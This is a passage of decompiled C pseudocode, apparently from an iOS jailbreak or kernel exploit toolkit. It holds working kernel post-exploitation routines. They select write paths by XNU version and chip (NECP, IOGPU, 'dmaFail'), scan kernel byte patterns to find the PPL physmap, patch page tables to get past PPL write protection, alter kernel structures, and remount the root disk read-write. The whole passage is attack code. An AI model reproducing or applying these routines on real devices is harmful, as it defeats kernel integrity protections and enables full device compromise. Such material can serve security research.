      if ( CFGetTypeID(valueToCompare) == v5 )
      {
        if ( CFArrayGetTypeID() == v5 )
        {
          arrayContext.status = 0;
          arrayContext.reserved = 0;
          arrayContext.object = value;
          Count = CFArrayGetCount(valueToCompare);
          v7 = (void (__cdecl *)(const void *, void *))nullsub_1(cfarray_contains_check);
          v12.location = 0;
          v12.length = Count;
          CFArrayApplyFunction(valueToCompare, v12, v7, &arrayContext);
          v8 = arrayContext.status;
LABEL_14:
          dictContext->status = v8;
          return;
        }
        if ( CFEqual(valueToCompare, value) )
        {
          dictContext->status = 0;
          return;
        }
      }
      v8 = 708628;
      goto LABEL_14;
    }
    v8 = 708609;
    goto LABEL_14;
  }
}
// 19728: using guessed type __int64 __fastcall nullsub_1(uint64_t);

//----- (0000000000012DB0) ----------------------------------------------------
void __fastcall cfarray_add_unique(const void *a1, __int64 a2)
{
  CfCollectionApplyContext *context; // x20
  CFArrayRef v4; // x21
  CFMutableArrayRef v5; // x0
  CFRange v7; // 0:x1.16

  context = (CfCollectionApplyContext *)a2;
  if ( context && !context->status )
  {
    if ( a1 )
    {
      v4 = (CFArrayRef)context->object;
      v7.length = CFArrayGetCount(v4);
      v7.location = 0;
      if ( !CFArrayContainsValue(v4, v7, a1) )
      {
        v5 = (CFMutableArrayRef)context->object;
        CFArrayAppendValue(v5, a1);
      }
    }
    else
    {
      context->status = 708609;
    }
  }
}
// 12E28: variable 'vars8' is possibly undefined

//----- (0000000000012E48) ----------------------------------------------------
const void *__fastcall check_cfstring_type(const void *result, uint8_t *a2)
{
  const void *v3; // x20

  if ( a2 )
  {
    if ( !result || (v3 = (const void *)CFGetTypeID(result), result = (const void *)CFStringGetTypeID(), v3 != result) )
      *a2 = 0;
  }
  return result;
}

//----- (0000000000012E88) ----------------------------------------------------
const void *__fastcall cfarray_contains_check(const void *result, __int64 a2)
{
  CfCollectionApplyContext *context; // x20
  const void *v3; // x20
  int v4; // w22
  CFArrayRef v5; // x21
  CFRange v6; // 0:x1.16

  context = (CfCollectionApplyContext *)a2;
  if ( context && !context->status )
  {
    v3 = result;
    v4 = 708609;
    if ( result )
    {
      v5 = (CFArrayRef)context->object;
      v6.length = CFArrayGetCount(v5);
      v6.location = 0;
      Boolean containsValue = CFArrayContainsValue(v5, v6, v3);
      if ( containsValue )
        return result;
      v4 = 708625;
    }
    context->status = v4;
  }
  return result;
}

//----- (0000000000012EF8) ----------------------------------------------------
void __fastcall necp_dispatch_by_version(struct_krwCtx *krwCtx)
{
  unsigned __int64 xnuVersionPacked; // x8
  bool a13PlusUsesNewNecpPath; // w0
  bool a15PlusUsesNewNecpPath; // w0

  xnuVersionPacked = krwCtx->xnuVersionPacked;
  a13PlusUsesNewNecpPath = krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A13_A14_A15_A16_A17_MASK)
                         && (xnuVersionPacked > XNU_VERSION_PACKED(10002, 0, 198, 1023, 1023)
                          || (xnuVersionPacked > XNU_VERSION_PACKED(8796, 142, 0, 1023, 1023) && krwCtx->xnuMajorVersion < 10002));
  a15PlusUsesNewNecpPath = krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A15_A16_A17_MASK)
                         && (xnuVersionPacked > XNU_VERSION_PACKED(10002, 0, 115, 1023, 1023)
                          || (xnuVersionPacked > XNU_VERSION_PACKED(8796, 122, 4, 1023, 1023) && krwCtx->xnuMajorVersion <= 10001));
  if ( a13PlusUsesNewNecpPath || a15PlusUsesNewNecpPath )
  {
    necp_send_msg_2(krwCtx);
  }
  else
  {
    nullsub_2(krwCtx);
  }
}
// 22D68: using guessed type __int64 __fastcall nullsub_2(uint64_t);

//----- (000000000001308C) ----------------------------------------------------
bool __fastcall check_necp_flag(struct_krwCtx *krwCtx)
{
  return krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_A13_A14_A15_A16_A17_MASK);
}

//----- (00000000000130B4) ----------------------------------------------------
bool __fastcall necp_kread_region(struct_krwCtx *krwCtx, unsigned __int64 a2, __int64 a3, unsigned int a4)
{
    __int64 v11; // x8
    unsigned __int64 v12; // x23
    unsigned __int64 v13; // x26
    __int64 v14; // x28
    int v15; // w0
    bool v16; // cc
    unsigned __int64 v17; // x8
    unsigned __int64 v18; // x9
    unsigned __int64 v19; // x10
    int v20; // w9
    __int64 v21; // x0
    __int64 v22; // [xsp+0h] [xbp-70h] BYREF
    uint32_t v230, v231; // [xsp+8h] [xbp-68h] BYREF
    unsigned __int64 v24; // [xsp+10h] [xbp-60h] BYREF
    __int64 v25; // [xsp+18h] [xbp-58h] BYREF

    v22 = 0;
    v230=0; v231=0;
    v24 = 0;
    v25 = 0;
    if ( !krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_A13_A14_A15_A16_A17_MASK)) return 0;
    if (!a2 || !a3 || !a4 ) return 0;
    if ( krwCtx->xnuVersionPacked >= XNU_VERSION_PACKED(8019, 0, 0, 0, 0) ) {
        return !!ppl_physmap_table_patch_write(krwCtx, a2, a3, a4, 0);
    }
    if ( get_kwrite_fn(krwCtx, &v24, &v231) )
    {
        if ( v24 <= a2 )
        {
            if ( a2 + a4 <= v24 + v231 )
            {
                if ( (unsigned int)lookup_physmap_page_slot(krwCtx, 3u, &v25) )
                {
                    if ( v25 )
                        goto LABEL_13;
                    v16 = (unsigned int)v231 > 0x8C000
                    || (unsigned __int64)(krwCtx->xnuVersionPacked - XNU_VERSION_PACKED(6153, 40, 121, 0, 0)) > 0xF788FFFFFLL;
                    v17 = v231 + 8;
                    if ( !v16 )
                        v17 = 573448;
                    v18 = krwCtx->pageSizeOrSomething;
                    v19 = v17 % v18;
                    v20 = v18 - v17 % v18;
                    if ( !v19 )
                        v20 = 0;
                    v230 = v17 + v20;
                    v21 = alloc_physmap_scratch_page(krwCtx, &v230);
                    v25 = v21;
                    if ( v21 )
                    {
                        if ( (unsigned int)cache_physmap_page_slot(krwCtx, 3u, v21) )
                        {
                        LABEL_13:
                            v11 = krwCtx->pageMask;
                            v12 = a2 & ~v11;
                            v13 = (a2 + a4 - 1) & ~v11;
                            if ( v12 > v13 )
                            {
                            LABEL_19:
                                return (unsigned int)kwrite_with_retry(krwCtx, a2 - v24 + v25, a3, a4) != 0;
                            }
                            else
                            {
                                while ( (unsigned int)krw_read_thunk(krwCtx, v25 + v231, 8, &v22) )
                                {
                                    v14 = 1 << ((v12 - v24) >> 14);
                                    if ( (v22 & v14) == 0 )
                                    {
                                        v15 = pgtable_walk_for_physmap(krwCtx, v25 + v12 - v24, v12);
                                        if ( !v15 )
                                            break;
                                        v22 |= v14;
                                        if ( !(unsigned int)kwrite_with_retry(krwCtx, v25 + v231, (__int64)&v22, 8) )
                                            break;
                                    }
                                    v12 += krwCtx->pageSizeOrSomething;
                                    if ( v12 > v13 )
                                        goto LABEL_19;
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    return 0;
}

//----- (0000000000013304) ----------------------------------------------------
bool __fastcall ppl_physmap_table_patch_write(struct_krwCtx *krwCtx, mach_vm_address_t vaddr, __int64 newBytes, __int64 size, int a5)
{
  int v10; // w0
  uint64_t pageMask; // x8
  mach_vm_address_t v12; // x24
  __int64 v13; // x27
  uint64_t *v14; // x8
  __int64 v15; // x9
  __int64 v16; // x10
  mach_vm_address_t v17; // x1
  __int64 v18; // x0
  __int64 v19; // x26
  __int64 v20; // x8
  unsigned __int64 v21; // x25
  unsigned __int64 v22; // x0
  int v23; // w0
  uint8_t v25[12]; // [xsp+4h] [xbp-5Ch] BYREF

  v10 = acquire_write_semaphore_lock(krwCtx, 5u, 0x2710u);
  if ( !v10 )
  {
    *(uint64_t *)&v25[4] = 0;
    pageMask = krwCtx->pageMask;
    v12 = vaddr & ~pageMask;
    if ( v12 == ((vaddr + (unsigned int)size - 1) & ~pageMask) )
    {
      if ( krwCtx->xnuVersionPacked <= XNU_VERSION_PACKED(8018, 1023, 1023, 1023, 1023) )
        v13 = 16;
      else
        v13 = 256;
      v14 = &krwCtx->gap_0x878;
      v15 = v13;
      do
      {
        if ( !*v14 )
          break;
        if ( v12 == *v14 )
        {
          v16 = *(v14 - 1);
          if ( v16 )
          {
            v17 = vaddr - v12 + v16;
LABEL_30:
            if ( (unsigned int)kwrite_something(krwCtx, v17, newBytes, size, a5) )
            {
              v10 = release_write_semaphore_lock(krwCtx, 5u);
              return v10 == 0;
            }
            goto LABEL_32;
          }
        }
        v14 += 2;
        --v15;
      }
      while ( v15 );
      if ( !(unsigned int)lookup_physmap_page_slot(krwCtx, 7u, (__int64 *)&v25[4]) )
        goto LABEL_32;
      if ( *(uint64_t *)&v25[4] )
      {
        if ( !(unsigned int)krw_read_thunk(krwCtx, *(__int64 *)&v25[4], (unsigned int)(16 * v13), &krwCtx->gap_0x870) )
          goto LABEL_32;
      }
      else
      {
        *(uint64_t *)v25 = (unsigned int)(16 * v13);
        v18 = alloc_physmap_scratch_page(krwCtx, v25);
        *(uint64_t *)&v25[4] = v18;
        if ( !v18 || !(unsigned int)cache_physmap_page_slot(krwCtx, 7u, v18) )
          goto LABEL_32;
        bzero(&krwCtx->gap_0x870, (unsigned int)(16 * v13));
      }
      v19 = 2160;
      while ( 1 )
      {
        v20 = *(uint64_t *)&krwCtx->raw_0x4[v19 + 4];
        if ( !v20 )
          break;
        if ( v12 == v20 )
        {
          v21 = *(uint64_t *)((char *)&krwCtx->flags + v19);
          if ( v21 )
            goto LABEL_29;
        }
        v19 += 16;
        if ( !--v13 )
          goto LABEL_32;
      }
      *(uint32_t *)v25 = krwCtx->pageSizeOrSomething;
      v22 = alloc_physmap_page(krwCtx, (unsigned int *)v25);
      if ( v22 )
      {
        if ( *(uint32_t *)v25 == krwCtx->pageSizeOrSomething )
        {
          v21 = v22;
          v23 = pgtable_walk_for_physmap(krwCtx, v22, v12);
          if ( v23 )
          {
            *(uint64_t *)&krwCtx->raw_0x4[v19 + 4] = v12;
            *(uint64_t *)((char *)&krwCtx->flags + v19) = v21;
            if ( (unsigned int)kwrite_with_retry(
                                 krwCtx,
                                 *(uint64_t *)&v25[4] + ((v19 - 2160) & 0xFFFFFFFF0LL),
                                 KRWCTX_RAW_PTR(krwCtx) + v19,
                                 16) )
            {
LABEL_29:
              v17 = vaddr - v12 + v21;
              goto LABEL_30;
            }
          }
        }
      }
    }
LABEL_32:
    release_write_semaphore_lock(krwCtx, 5u);
    v10 = 708619;
  }
  return v10 == 0;
}
//----- (000000000001353C) ----------------------------------------------------
bool __fastcall get_kwrite_fn(struct_krwCtx *krwCtx, uint64_t *a2, uint32_t *a3)
{
  uint64_t physmapBase = krwCtx->pplPhysmapBase;
  uint32_t physmapSize = krwCtx->pplPhysmapSize;
  if ( physmapBase )
  {
    *a2 = physmapBase;
    *a3 = physmapSize;
    return 1;
  }

  uint64_t machoCtx = krwCtx->kernelMachoCtx;
  uint32_t xnuMajorVersion = *(uint32_t *)(machoCtx + 112);
  const char *pattern = "1F 01 13 EB 20 91 53 FA .. .. 00 54 68 02";
  if ( xnuMajorVersion > 8791 )
  {
    if ( xnuMajorVersion != 8792 && xnuMajorVersion != 8796 && xnuMajorVersion != 10002 )
      pattern = 0;
  }
  else if ( (unsigned int)(xnuMajorVersion - 8019) >= 2 )
  {
    if ( xnuMajorVersion == 6153 )
      pattern = "1F 01 .. EB 20 91 .. FA .. .. 00 54";
    else if ( xnuMajorVersion != 7195 )
      pattern = 0;
  }
  if ( !pattern )
    return 0;

  SearchObj pplTextRange;
  macho_walk_segment_by_name("__PPLTEXT", machoCtx, &pplTextRange);
  if ( krwCtx->xnuVersionPacked >= XNU_VERSION_PACKED(6153, 102, 2, 0, 0) && krwCtx->xnuMajorVersion <= 7194 )
  {
    if ( !pplTextRange.base_ptr )
      return 0;
    uint64_t pageSize = krwCtx->pageSizeOrSomething;
    if ( pplTextRange.size <= pageSize )
      return 0;
    pplTextRange.base_ptr += pageSize;
    pplTextRange.size -= pageSize;
  }

  uint64_t patternHit = kernel_pattern_scan(&pplTextRange, pattern, 0);
  if ( !patternHit )
    return 0;

  uint64_t baseRef = find_kernel_func((__int64 *)krwCtx->kernelMachoCtx, (__int64 *)(patternHit - 16));
  physmapBase = baseRef ? macho_read_u64_thunk(krwCtx->kernelMachoCtx, baseRef) : 0;
  if ( !physmapBase )
    return 0;

  if ( krwCtx->xnuMajorVersion >= 7195 )
  {
    uint64_t endRef = find_kernel_func((__int64 *)krwCtx->kernelMachoCtx, (__int64 *)(patternHit - 8));
    if ( !endRef )
      return 0;
    uint64_t physmapEnd = macho_read_u64_thunk(krwCtx->kernelMachoCtx, endRef);
    if ( !physmapEnd )
      return 0;
    physmapSize = physmapEnd - physmapBase;
  }
  else if ( krwCtx->xnuMajorVersion < 6153 )
  {
    physmapSize = 589824;
  }
  else if ( krwCtx->xnuVersionPacked <= XNU_VERSION_PACKED(6153, 40, 120, 1023, 1023) )
  {
    physmapSize = 573440;
  }
  else
  {
    physmapSize = 557056;
  }

  krwCtx->pplPhysmapBase = physmapBase;
  krwCtx->pplPhysmapSize = physmapSize;
  *a2 = physmapBase;
  *a3 = physmapSize;
  return 1;
}
// 19B94: using guessed type __int64 __fastcall macho_read_u64_thunk(uint64_t, uint64_t);

//----- (0000000000013750) ----------------------------------------------------
bool __fastcall pgtable_walk_for_physmap(struct_krwCtx *krwCtx, unsigned __int64 a2, unsigned __int64 a3)
{
  unsigned __int64 v6; // x21
  __int64 v8; // x20
  unsigned __int64 v9; // x22
  unsigned __int64 v10; // x21
  struct
  {
    __int128 q0;
    __int128 q1;
    unsigned __int64 q2;
  } v11, v14;

  memset(&v11, 0, sizeof(v11));
  memset(&v14, 0, sizeof(v14));
  if ( pgtable_walk_wrapper(krwCtx, a3, &v11) )
  {
    asm volatile("" ::: "memory");
    if ( BYTE4(v11.q1) == 3 )
    {
      v6 = v11.q2;
      if ( pgtable_walk_wrapper(krwCtx, a2, &v14) )
      {
        asm volatile("" ::: "memory");
        if ( BYTE4(v14.q1) == 3 )
        {
          v8 = *(__int64 *)&v14.q0;
          v9 = v14.q2;
          v10 = (v14.q2 & 0xFFFF000000003FFFLL) | (((v6 >> 14) & 0x3FFFFFFFFLL) << 14);
          if ( ((unsigned int)v10 == (unsigned int)v14.q2 || check_physmap_range_necp(krwCtx, *(__int64 *)&v14.q0, v10))
            && (HIDWORD(v9) == HIDWORD(v10) || check_physmap_range_necp(krwCtx, v8 + 4, SHIDWORD(v10))) )
          {
            semaphore_timedwait_ns(krwCtx, 0x2710u);
            return 1;
          }
        }
      }
    }
  }
  return 0;
}

//----- (0000000000013844) ----------------------------------------------------
// DONE: matches orig asm shape; x0 carries the bool result from the tail call/callee.
bool __fastcall physmap_table_write_versioned(struct_krwCtx *krwCtx, unsigned __int64 a2, int a3)
{
    int v8; // [xsp+1Ch] [xbp-24h] BYREF
    unsigned __int64 v7; // [xsp+10h] [xbp-30h] BYREF
    unsigned int v6; // [xsp+Ch] [xbp-34h] BYREF

    v8 = a3;
    v7 = 0;
    v6 = 0;
    if ( !krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_A13_A14_A15_A16_A17_MASK) ) return 0;
    if ( krwCtx->xnuVersionPacked >= (uint64_t)XNU_VERSION_PACKED(8019, 0, 0, 0, 0) )
        return check_physmap_range_necp(krwCtx, a2, a3);
    if ( !get_kwrite_fn(krwCtx, &v7, &v6) )
        return 0;
    if ( v7 <= a2 && a2 + 4 <= v7 + v6 ) {
        return necp_kread_region(krwCtx, a2, (__int64)&v8, 4);
    }
    return check_physmap_range_necp(krwCtx, a2, a3);
}

//----- (0000000000013924) ----------------------------------------------------
bool __fastcall check_physmap_range_necp(struct_krwCtx *krwCtx, unsigned __int64 a2, int a3)
{
  unsigned __int64 xnuVersionPacked; // x8
  int v8; // w0
  bool a13PlusUsesNewNecpPath; // w0
  bool a15PlusUsesNewNecpPath; // w0
  bool a13PlusUsesIogpuPath; // w0
  bool a15PlusUsesIogpuPath; // w0

  xnuVersionPacked = krwCtx->xnuVersionPacked;
  a13PlusUsesNewNecpPath = krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A13_A14_A15_A16_A17_MASK)
                         && (xnuVersionPacked > XNU_VERSION_PACKED(10002, 0, 198, 1023, 1023)
                          || (xnuVersionPacked > XNU_VERSION_PACKED(8796, 142, 0, 1023, 1023) && krwCtx->xnuMajorVersion < 10002));
  a15PlusUsesNewNecpPath = krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A15_A16_A17_MASK)
                         && (xnuVersionPacked > XNU_VERSION_PACKED(10002, 0, 115, 1023, 1023)
                          || (xnuVersionPacked > XNU_VERSION_PACKED(8796, 122, 4, 1023, 1023) && krwCtx->xnuMajorVersion <= 10001));
  if ( a13PlusUsesNewNecpPath || a15PlusUsesNewNecpPath )
  {
    v8 = pgtable_locked_kwrite32_retry(krwCtx, a2, a3);
    return v8 == 0;
  }

  a13PlusUsesIogpuPath = krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A13_A14_A15_A16_A17_MASK)
                       && (xnuVersionPacked > XNU_VERSION_PACKED(10002, 0, 198, 1023, 1023)
                        || (xnuVersionPacked > XNU_VERSION_PACKED(8796, 142, 0, 1023, 1023) && krwCtx->xnuMajorVersion < 10002));
  a15PlusUsesIogpuPath = krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A15_A16_A17_MASK)
                       && (xnuVersionPacked > XNU_VERSION_PACKED(10002, 0, 115, 1023, 1023)
                        || (xnuVersionPacked > XNU_VERSION_PACKED(8796, 122, 4, 1023, 1023) && krwCtx->xnuMajorVersion < 10002));
  if ( a13PlusUsesIogpuPath || a15PlusUsesIogpuPath )
  {
    if ( xnuVersionPacked > XNU_VERSION_PACKED(10002, 42, 7, 1023, 1023) )
      return 0;
    v8 = iogpu_kernel_read_op(krwCtx, a2, a3);
    return v8 == 0;
  }
  v8 = dmaFail_physwrite32(krwCtx, a2, a3);
  return v8 == 0;
}

//----- (0000000000013AE4) ----------------------------------------------------
__int64 __fastcall ppl_kwritebuf(struct_krwCtx *krwCtx, unsigned __int64 vaddr, void *newBytes, int size)
{
  __int64 v8; // x20
  char v9; // w23
  unsigned int v10; // w26
  mach_vm_address_t vaddr_; // x25
  unsigned int v12; // w9
  size_t size_; // x24
  unsigned int v14; // w28
  char *newBytes_; // x26
  int v16; // w0
  vm_address_t address; // [xsp+8h] [xbp-58h] BYREF

  if ( vm_allocate(mach_task_self_, &address, krwCtx->pageSizeOrSomething, 1) )
    return 0;
  v9 = kaddr_need_ppl_bypass(krwCtx, vaddr);
  v10 = 0;
  while ( 1 )
  {
    vaddr_ = vaddr + v10;
    v12 = krwCtx->pageSizeOrSomething - (vaddr_ & (uint32_t)krwCtx->pageMask);
    size_ = size - v10 <= v12 ? size - v10 : v12;
    if ( !(unsigned int)krw_read_thunk(krwCtx, vaddr + v10, size_, (void *)address) )
      break;
    v14 = v10;
    newBytes_ = (char *)newBytes + v10;
    if ( memcmp((const void *)address, newBytes_, size_) )
    {
      v16 = ppl_kwritebuf_nocheck(krwCtx, vaddr_, (__int64)newBytes_, size_, v9, 0);
      if ( !v16 )
        break;
    }
    v10 = size_ + v14;
    if ( (uint32_t)size_ + v14 == size )
    {
      v8 = 1;
      goto LABEL_13;
    }
  }
  v8 = 0;
LABEL_13:
  vm_deallocate(mach_task_self_, address, krwCtx->pageSizeOrSomething);
  return v8;
}
// 13BC4: variable 'v16' is possibly undefined

//----- (0000000000013C14) ----------------------------------------------------
bool __fastcall kaddr_need_ppl_bypass(struct_krwCtx *krwCtx, unsigned __int64 vaddr)
{
  uint64_t result; // x0
  __int64 v5; // x8
  unsigned __int64 v6; // x9

  result = 1;
  if ( !map_physpage_to_user(krwCtx, vaddr, 0, vaddr) )
  {
    v5 = KRWCTX_FIELD_U64(krwCtx, 6648);
    if ( !v5 )
      return 0;
    v6 = *(uint64_t *)(v5 + 224);
    if ( v6 > vaddr || *(uint64_t *)(v5 + 232) + v6 <= vaddr )
      return 0;
  }
  return result;
}

//----- (0000000000013C78) ----------------------------------------------------
bool __fastcall ppl_kwritebuf_nocheck(
        struct_krwCtx *krwCtx,
        mach_vm_address_t vaddr,
        __int64 newBytes,
        __int64 size,
        char pplBypass,
        int a6)
{
  __int64 v10; // x8
  mach_vm_address_t v11; // x1
  struct
  {
    unsigned __int64 base;
    unsigned __int8 gap8[12];
    unsigned __int8 prot;
    unsigned __int8 gap15[11];
    __int64 flags;
  } regionInfo; // [xsp+8h] [xbp-58h] BYREF

  if ( vaddr )
  {
    if ( newBytes )
    {
      if ( (uint32_t)size )
      {
        v10 = krwCtx->pageMask;
        v11 = vaddr & ~v10;
        if ( v11 == ((vaddr + (unsigned int)size - 1) & ~v10) )
        {
          if ( (pplBypass & 1) != 0 )
          {
            return ppl_physmap_table_patch_write(krwCtx, vaddr, newBytes, size, a6);
          }
          else
          {
            memset(&regionInfo, 0, sizeof(regionInfo));
            if ( pgtable_walk_wrapper(krwCtx, v11, &regionInfo) && (regionInfo.prot | 2) == 3 )
            {
              if ( (regionInfo.flags & 0x80) != 0 )
              {
                if ( !physmap_table_write_versioned(krwCtx, regionInfo.base, regionInfo.flags & 0xFFFFFF7F) )
                  return 0;
                semaphore_timedwait_ns(krwCtx, 0x2710u);
              }
              return (unsigned int)kwrite_something(krwCtx, vaddr, newBytes, size, a6) != 0;
            }
          }
        }
      }
    }
  }
  return 0;
}

//----- (0000000000013D9C) ----------------------------------------------------
bool __fastcall ppl_kwrite_physmap_checked(struct_krwCtx *krwCtx, unsigned __int64 a2, __int64 a3)
{
    char v6; // w0
    unsigned __int64 v7; // [xsp+0h] [xbp-30h] BYREF
    __int64 v8; // [xsp+8h] [xbp-28h] BYREF
    
    v8 = a3;
    if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_A13_A14_A15_A16_A17_MASK) && kread_physmap_decorated(krwCtx, a2, &v7) )
    {
        if ( v7 == a3 )
            return true;
        v6 = kaddr_need_ppl_bypass(krwCtx, a2);
        return ppl_kwritebuf_nocheck(krwCtx, a2, (__int64)&v8, (unsigned int)krwCtx->stride_0x168, v6, 1);
    }
    return false;
}

//----- (0000000000013E38) ----------------------------------------------------
__int64 __fastcall kwrite_something(struct_krwCtx *krwCtx, mach_vm_address_t a2, __int64 a3, __int64 a4, int a5)
{
  __int64 result; // x0
  __int64 v6; // [xsp+8h] [xbp-18h] BYREF

  if ( !a5 || krwCtx->stride_0x168 != (uint32_t)a4 )
  {
    result = kwrite_with_retry(krwCtx, a2, a3, a4);
    if ( !(uint32_t)result )
      return result;
    return 1;
  }
  v6 = 0;
  __memcpy_chk(&v6, (const void *)a3, (unsigned int)a4, 8);
  result = kwrite64(krwCtx, a2, v6);
  if ( (uint32_t)result )
    return 1;
  return result;
}

//----- (0000000000013EBC) ----------------------------------------------------
__int64 __fastcall get_root_statfs(struct_krwCtx *krwCtx, int *outIsReadWrite)
{
  char *v3; // x20
  int isReadWrite; // w8
  __int16 v6; // [xsp+Eh] [xbp-8D2h] BYREF
  char mnt1[48]; // [xsp+10h] [xbp-8D0h] BYREF
  struct statfs v8; // [xsp+40h] [xbp-8A0h] BYREF

  bzero(&v8, 0x878u);
  v6 = 47;
  strcpy(mnt1, "/private/var/MobileSoftwareUpdate/mnt1");
  if ( check_root_fs_mounted(0) )
    v3 = mnt1;
  else
    v3 = (char *)&v6;
  if ( statfs(v3, &v8) )
  {
    if ( errno != 2 )
      return 0;
  }
  else if ( !((*(uint64_t *)v8.f_mntfromname ^ 'sid/ved/') | (*(uint64_t *)&v8.f_mntfromname[7] ^ '1s1s0ks'))
         && !strcmp(v3, v8.f_mntonname) )
  {
    isReadWrite = (v8.f_flags & MNT_RDONLY) == 0;
    goto LABEL_10;
  }
  isReadWrite = 3;
LABEL_10:
  *outIsReadWrite = isReadWrite;
  return 1;
}

//----- (0000000000013FF8) ----------------------------------------------------
bool __fastcall check_iogpu_krw_ready_3(struct_krwCtx *krwCtx, char *a2)
{
  int v3; // w8
  uint64_t v4; // x21
  __int64 v5; // x21
  int v6; // w0
  int v7; // w20
  __int64 v8; // x0
  int v10; // [xsp+4h] [xbp-2Ch] BYREF
  __int64 v11; // [xsp+8h] [xbp-28h] BYREF

  v10 = 0;
  v3 = krwCtx->xnuMajorVersion;
  if ( (unsigned int)(v3 - 8019) < 2 )
  {
    v5 = 608;
  }
  else if ( v3 == 6153 )
  {
    v5 = 520;
  }
  else
  {
    v4 = 0;
    if ( v3 != 7195 )
      return v4;
    if ( krwCtx->xnuVersionPacked <= XNU_VERSION_PACKED(7195, 100, 325, 1023, 1023) )
      v5 = 536;
    else
      v5 = 512;
  }
  v6 = open(a2, 0x100000);
  if ( v6 < 0 )
    return 0;
  v7 = v6;
  v8 = get_kernel_base_physmap(krwCtx, v7);
  v11 = v8;
  if ( v8
    && kread_physmap_decorated(krwCtx, v8 + v5, (unsigned __int64 *)&v11)
    && validate_kaddr_range(krwCtx, v11)
    && kread_physmap_decorated(krwCtx, v11 + 224, (unsigned __int64 *)&v11)
    && validate_kaddr_range(krwCtx, v11)
    && (unsigned int)krw_read_thunk(krwCtx, v11 + 48, 4, &v10) )
  {
    v10 &= ~0x4000u;
    v4 = (unsigned int)kwrite_with_retry(krwCtx, v11 + 48, (__int64)&v10, 4) != 0;
  }
  else
  {
    v4 = 0;
  }
  close(v7);
  return v4;
}

//----- (0000000000014164) ----------------------------------------------------
__int64 __fastcall get_kernel_base_physmap(struct_krwCtx *krwCtx, int a2)
{
  int xnuMajorVersion; // w8
  __int64 result; // x0
  __int64 v7; // [xsp+8h] [xbp-18h] BYREF

  xnuMajorVersion = krwCtx->xnuMajorVersion;
  if ( (unsigned int)(xnuMajorVersion - 8019) >= 2 && xnuMajorVersion != 7195 && xnuMajorVersion != 6153 )
    return 0;
  result = get_kbase_from_fileport(krwCtx, a2);
  if ( !result )
    return result;
  v7 = result + 2296;
  if ( !kread_physmap_decorated(krwCtx, result + 2296, (unsigned __int64 *)&v7) )
    return 0;
  if ( validate_kaddr_range(krwCtx, v7) )
    return v7;
  return 0;
}

//----- (00000000000141F0) ----------------------------------------------------
__int64 __fastcall check_root_disk_identity(struct_krwCtx *krwCtx)
{
  __int64 result; // x0
  unsigned int v3; // w20
  int v4; // w0
  char v6[2]; // [xsp+6h] [xbp-8CAh] BYREF
  struct statfs v7; // [xsp+8h] [xbp-8C8h] BYREF
  char v8[40]; // [xsp+880h] [xbp-50h] BYREF

  strcpy(v6, "/");
  strcpy(v8, "/private/var/MobileSoftwareUpdate/mnt1");
  bzero(&v7, 0x878u);
  if ( statfs(v6, &v7) )
    return 0;
  result = add_rw_to_disk(krwCtx, v6, "/dev/disk0s1s1");
  if ( (uint32_t)result )
  {
    v3 = 0;
    do
    {
      usleep(0x186A0u);
      v4 = check_path_on_disk0s1s1(v8);
      if ( !v4 )
        break;
    }
    while ( v3++ < 0x32 );
    if ( !v4 )
      return 1;
    add_rw_to_disk(krwCtx, v6, v7.f_mntfromname);
    return 0;
  }
  return result;
}

//----- (00000000000142F8) ----------------------------------------------------
__int64 __fastcall add_rw_to_disk(struct_krwCtx *krwCtx, const char *a2, const char *a3)
{
  int v6; // w8
  size_t v9; // x0
  int v10; // w22
  int v11; // w0
  int v12; // w21
  __int64 v13; // x0
  __int64 v14; // x23
  __int64 arg_1; // x19
  int v17; // [xsp+Ch] [xbp-8B4h] BYREF
  struct statfs v18; // [xsp+10h] [xbp-8B0h] BYREF

  bzero(&v18, 0x878u);
  v17 = 0;
  v6 = krwCtx->xnuMajorVersion;
  if ( (unsigned int)(v6 - 8019) >= 2 && v6 != 7195 && v6 != 6153 )
    return 0;
  if ( statfs(a2, &v18) )
    return 0;
  v9 = strlen(a3);
  if ( v9 > 0x3FF )
    return 0;
  v10 = v9;
  v11 = open(a2, 0);
  if ( v11 < 1 )
    return 0;
  v12 = v11;
  v13 = ((__int64 (__cdecl *)())get_kbase_from_fileport)();
  if ( v13
    && (v14 = v13 + 1252, (unsigned int)krw_read_thunk(krwCtx, v13 + 1252, 4, &v17))
    && v17 == *(uint32_t *)v18.f_mntfromname )
  {
    arg_1 = kwrite_with_retry(krwCtx, v14, (__int64)a3, (unsigned int)(v10 + 1));
  }
  else
  {
    arg_1 = 0;
  }
  close(v12);
  return arg_1;
}

//----- (0000000000014444) ----------------------------------------------------
bool __fastcall check_path_on_disk0s1s1(const char *a1)
{
  struct statfs v3; // [xsp+0h] [xbp-8A0h] BYREF

  bzero(&v3, 0x878u);
  if ( statfs(a1, &v3) )
  {
    __error();
  }
  else if ( !((*(uint64_t *)v3.f_mntfromname ^ 0x7369642F7665642FLL) | (*(uint64_t *)&v3.f_mntfromname[7] ^ 0x31733173306B73LL)) )
  {
    return strcmp(a1, v3.f_mntonname) == 0;
  }
  return 0;
}

//----- (0000000000014524) ----------------------------------------------------
__int64 __fastcall check_mount_thread_info(struct_krwCtx *krwCtx, int a2)
{
  int v4; // w21
  char *v5; // x0
  const char *v6; // x1
  char v7; // w2
  __int64 v8; // x20
  struct_krwCtx *v9; // x0
  int v10; // w1
  const char *v11; // x8
  int v12; // w20
  int v13; // w21
  int v14; // w0
  int v16; // w0
  char v18[3]; // [xsp+4h] [xbp-8Ch] BYREF
  bool v19; // [xsp+7h] [xbp-89h] BYREF
  struct statfs *v20; // [xsp+8h] [xbp-88h] BYREF
  char __s1[39]; // [xsp+10h] [xbp-80h] BYREF
  const char *v22[6]; // [xsp+38h] [xbp-58h] BYREF

  v19 = 0;
  strcpy(__s1, "/private/var/MobileSoftwareUpdate/mnt1");
  strcpy(v18, "/");
  krw_ctx_set_flag(krwCtx, KRW_CTX_FLAG_SNAPSHOT_MOUNTED);
